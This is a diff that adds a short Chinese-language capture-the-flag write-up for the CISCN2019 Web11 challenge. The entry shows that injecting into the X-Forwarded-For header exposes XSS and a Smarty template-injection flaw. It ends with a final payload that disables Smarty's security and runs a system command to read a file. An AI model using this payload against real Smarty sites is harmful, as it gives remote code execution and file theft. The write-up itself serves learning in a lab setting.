@@ -87,5 +87,12 @@
               
               
               
-              
+7       2026/5/14              [CISCN2019 华东南赛区]Web11            进入页面，访问页面中的api和xff，结果没用。看到页面右上角有Current IP:192.168.122.15，怀疑可以ssti或者xss。
+                                                                     因为回显ip，所以我加一个X-Forwarded-For: </div><a href='http://www.baidu.com'>nihao</a>,结果成功，说明可以xss，
+                                                                      但这里没有用
+                                                                     之后尝试XFF： {{1+1}}成功，说明有ssti，最终确定为Smarty 引擎。
+                                                                     最终 payload:
+                                                                       X-Forwarded-For: 
+                                                                       {$smarty.template_object->smarty->disableSecurity()->display('string:{system("cat /flag")}')}           
+                                                                     
                                                                                            
